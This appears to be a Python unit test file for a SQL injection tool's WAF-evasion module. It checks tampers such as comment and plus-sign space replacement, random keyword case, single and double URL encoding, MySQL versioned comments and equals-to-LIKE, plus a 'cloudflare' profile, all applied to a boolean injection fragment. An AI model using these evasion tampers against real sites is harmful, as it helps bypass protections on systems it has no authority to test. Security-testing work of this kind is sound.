"""Unit tests for WAF-evasion payload tampers."""

import random
import unittest

from payloads import TamperingPayloadBuilder
from payloads.tamper import (
    CharEncodeTamper,
    DoubleEncodeTamper,
    EqualsToLikeTamper,
    RandomCaseTamper,
    SpaceToCommentTamper,
    SpaceToPlusTamper,
    VersionedCommentTamper,
    available_profiles,
    available_tampers,
    build_tamper,
    resolve_tampers,
)
from payloads.contracts import PayloadBuilder


class FakePayloadBuilder(PayloadBuilder):
    def build(self, condition: str) -> str:
        return f"' AND ({condition})--"


class ConcreteTamperTests(unittest.TestCase):
    def test_space_to_comment(self) -> None:
        self.assertEqual(
            SpaceToCommentTamper().apply("' AND (1=1)--"),
            "'/**/AND/**/(1=1)--",
        )

    def test_space_to_plus(self) -> None:
        self.assertEqual(SpaceToPlusTamper().apply("' AND (1=1)--"), "'+AND+(1=1)--")

    def test_random_case_only_touches_known_keywords(self) -> None:
        tamper = RandomCaseTamper(rng=random.Random(1234))
        result = tamper.apply("' AND (1=1) OR (2=2)--")
        self.assertEqual(result.upper(), "' AND (1=1) OR (2=2)--".upper())
        # with a fixed seed the exact mixed-case output is deterministic
        self.assertEqual(result, RandomCaseTamper(rng=random.Random(1234)).apply(
            "' AND (1=1) OR (2=2)--"
        ))

    def test_random_case_ignores_non_keyword_text(self) -> None:
        tamper = RandomCaseTamper(rng=random.Random(1))
        result = tamper.apply("secret()")
        self.assertEqual(result, "secret()")

    def test_char_encode(self) -> None:
        self.assertEqual(CharEncodeTamper().apply("1=1"), "1%3D1")

    def test_double_encode(self) -> None:
        self.assertEqual(DoubleEncodeTamper().apply("1=1"), "1%253D1")

    def test_versioned_comment(self) -> None:
        self.assertEqual(
            VersionedCommentTamper().apply("' AND (1=1)--"),
            "/*!50000' AND (1=1)--*/",
        )

    def test_equals_to_like_only_replaces_bare_equals(self) -> None:
        tamper = EqualsToLikeTamper()
        self.assertEqual(tamper.apply("ASCII(x)=97"), "ASCII(x) LIKE 97")
        self.assertEqual(tamper.apply("x<=1 AND y>=2 AND z!=3"), "x<=1 AND y>=2 AND z!=3")


class RegistryTests(unittest.TestCase):
    def test_available_tampers_and_profiles_are_sorted_and_non_empty(self) -> None:
        self.assertEqual(list(available_tampers()), sorted(available_tampers()))
        self.assertIn("space2comment", available_tampers())
        self.assertEqual(list(available_profiles()), sorted(available_profiles()))
        self.assertIn("cloudflare", available_profiles())

    def test_build_tamper_rejects_unknown_name(self) -> None:
        with self.assertRaises(ValueError):
            build_tamper("does-not-exist")

    def test_resolve_tampers_expands_profiles_and_dedupes_in_order(self) -> None:
        resolved = resolve_tampers(["cloudflare", "randomcase", "space2comment"])
        self.assertEqual(resolved, ("space2comment", "randomcase", "charencode"))

    def test_resolve_tampers_rejects_unknown_item(self) -> None:
        with self.assertRaises(ValueError):
            resolve_tampers(["not-a-real-tamper-or-profile"])

    def test_resolve_tampers_ignores_blank_entries(self) -> None:
        self.assertEqual(resolve_tampers(["space2comment", "  ", ""]), ("space2comment",))


class TamperingPayloadBuilderTests(unittest.TestCase):
    def test_applies_tampers_in_order_to_inner_output(self) -> None:
        builder = TamperingPayloadBuilder(
            inner=FakePayloadBuilder(),
            tampers=(SpaceToCommentTamper(), VersionedCommentTamper()),
        )

        result = builder.build("1=1")

        self.assertEqual(result, "/*!50000'/**/AND/**/(1=1)--*/")

    def test_empty_tamper_chain_passes_through_unchanged(self) -> None:
        builder = TamperingPayloadBuilder(inner=FakePayloadBuilder(), tampers=())

        self.assertEqual(builder.build("1=1"), "' AND (1=1)--")


if __name__ == "__main__":
    unittest.main()
